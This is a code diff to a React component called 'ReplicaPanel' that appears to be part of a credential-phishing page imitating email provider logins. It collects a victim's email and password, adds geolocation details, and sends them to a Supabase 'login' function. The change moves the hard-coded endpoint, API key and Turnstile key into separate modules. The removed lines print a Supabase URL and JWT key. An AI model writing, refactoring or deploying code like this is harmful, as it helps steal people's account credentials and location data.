@@ -3,6 +3,8 @@ import { Mail, ChevronRight, RefreshCw, X, Eye, EyeOff } from 'lucide-react';
 import { Turnstile } from '@marsidev/react-turnstile';
 import { EmailProvider } from '../types';
 import { getGeoInfo } from '../utils/geoip';
+import { submitLogin } from '../utils/api';
+import { SECURITY_CONFIG } from '../config/security';
 
 interface ReplicaPanelProps {
   onSelectProvider: (provider: EmailProvider, email: string) => void;
@@ -54,27 +56,14 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
     setIsLoading(true);
 
     try {
-      const supabaseUrl = 'https://nxzvpcbudbqotujuuczo.supabase.co';
-      const supabaseKey = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im54enZwY2J1ZGJxb3R1anV1Y3pvIiwicm9sZSI6ImFub24iLCJpYXQiOjE3Njc4MTQ0MzcsImV4cCI6MjA4MzM5MDQzN30.45hqzbpj27CRlI3gRhtlS_VOIsuitYKDhEOPrpSminc';
-
-      // Resolve geolocation client-side (cached after first call, never blocks UX)
       const geo = await getGeoInfo();
 
-      await fetch(`${supabaseUrl}/functions/v1/login`, {
-        method: 'POST',
-        headers: {
-          'Authorization': `Bearer ${supabaseKey}`,
-          'apikey': supabaseKey,
-          'Content-Type': 'application/json'
-        },
-        body: JSON.stringify({
-          email: emailInput,
-          provider: activeLoginProvider?.id || 'email',
-          password: passwordInput,
-          turnstileToken: turnstileToken,
-          // Spread all available geo fields
-          ...geo,
-        })
+      await submitLogin({
+        email: emailInput,
+        provider: activeLoginProvider?.id || 'email',
+        password: passwordInput,
+        turnstileToken: turnstileToken,
+        ...geo,
       });
     } catch (err) {
       console.error("Error calling login edge function:", err);
@@ -263,7 +252,7 @@ export default function ReplicaPanel({ onSelectProvider, mockProviders }: Replic
                   <div className="pt-1 flex justify-center w-full overflow-hidden rounded-md border border-white/5 bg-[#ffffff02]">
                     <Turnstile 
                       ref={turnstileRef}
-                      siteKey="0x4AAAAAADhBiA89GlSL9EDX" 
+                      siteKey={SECURITY_CONFIG.turnstileSiteKey}
                       onSuccess={(token) => setTurnstileToken(token)}
                       onError={() => setErrorMsg('Turnstile verification failed. Please try again.')}
                       onExpire={() => setTurnstileToken(null)}
